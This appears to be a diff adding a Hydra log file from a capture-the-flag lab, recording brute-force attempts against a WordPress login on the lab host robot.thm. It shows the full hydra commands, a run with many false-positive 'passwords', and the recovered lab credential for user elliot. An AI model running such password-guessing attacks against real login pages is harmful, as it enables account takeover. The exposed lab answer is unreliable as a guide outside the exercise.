@@ -1,0 +1,29 @@
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-17 09:26:24
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
+[DATA] attacking http-post-form://robot.thm:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Dashboard
+[STATUS] 1079.00 tries/min, 1079 tries in 00:01h, 10373 to do in 00:10h, 16 active
+[STATUS] 1081.67 tries/min, 3245 tries in 00:03h, 8207 to do in 00:08h, 16 active
+[STATUS] 1085.43 tries/min, 7598 tries in 00:07h, 3854 to do in 00:04h, 16 active
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-17 09:38:10
+# Hydra v9.4 run at 2025-08-17 09:44:02 on robot.thm http-post-form (hydra -l elliot -P fsocity-uniq.txt -o scans/hydra-login.txt robot.thm http-post-form /wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username)
+[80][http-post-form] host: robot.thm   login: elliot   password: from
+[80][http-post-form] host: robot.thm   login: elliot   password: the
+[80][http-post-form] host: robot.thm   login: elliot   password: true
+[80][http-post-form] host: robot.thm   login: elliot   password: Robot
+[80][http-post-form] host: robot.thm   login: elliot   password: var
+[80][http-post-form] host: robot.thm   login: elliot   password: window
+[80][http-post-form] host: robot.thm   login: elliot   password: extensions
+[80][http-post-form] host: robot.thm   login: elliot   password: scss
+[80][http-post-form] host: robot.thm   login: elliot   password: http
+[80][http-post-form] host: robot.thm   login: elliot   password: false
+[80][http-post-form] host: robot.thm   login: elliot   password: now
+[80][http-post-form] host: robot.thm   login: elliot   password: page
+[80][http-post-form] host: robot.thm   login: elliot   password: Elliot
+[80][http-post-form] host: robot.thm   login: elliot   password: styles
+[80][http-post-form] host: robot.thm   login: elliot   password: wikia
+[80][http-post-form] host: robot.thm   login: elliot   password: Wikia
+# Hydra v9.4 run at 2025-08-17 09:45:44 on robot.thm http-post-form (hydra -l elliot -P fsocity-uniq.txt -o scans/hydra-login.txt robot.thm http-post-form /wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username)
+[80][http-post-form] host: robot.thm   login: elliot   password: ER28-0652
